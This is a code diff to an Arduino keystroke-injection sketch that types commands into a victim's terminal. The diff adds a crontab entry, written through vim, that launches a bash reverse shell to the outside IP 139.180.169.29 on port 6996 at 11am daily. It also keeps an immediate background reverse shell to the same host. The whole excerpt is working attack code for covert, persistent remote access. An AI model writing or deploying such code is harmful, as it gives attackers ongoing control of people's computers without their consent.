@@ -37,19 +37,52 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(200);
-  Keyboard.print(F(" bash"));
+  Keyboard.print(F("bash"));
 
   typeKey(KEY_RETURN);
 
-  // enables job control so we can set reverse shell to run in bg
+  // enable background jobs
   delay(200);
-  Keyboard.print(F(" set -m"));
+  Keyboard.print(F("set -m"));
+
+  typeKey(KEY_RETURN);
+
+  // add reverse shell to cron
+  delay(200);
+  Keyboard.print(F("export EDITOR=vim"));
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+  Keyboard.print(F("crontab -e"));
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+  Keyboard.print(F("g"));
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+  Keyboard.print(F("$"));
+
+  typeKey(KEY_RETURN);
+
+  // set the reverse shell to occur 11am every day
+  delay(200);
+  Keyboard.print(F("0 11 * * * /bin/sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\\\" && exit"));
+
+  typeKey(KEY_RETURN);
+
+  // Exit vim
+  delay(200);
+  Keyboard.print(F(":wq"));
 
   typeKey(KEY_RETURN);
 
   // spawns a reverse shell in background
   delay(200);
-  Keyboard.print(F(" sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit"));
+  Keyboard.print(F("sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit"));
 
   typeKey(KEY_RETURN);
 
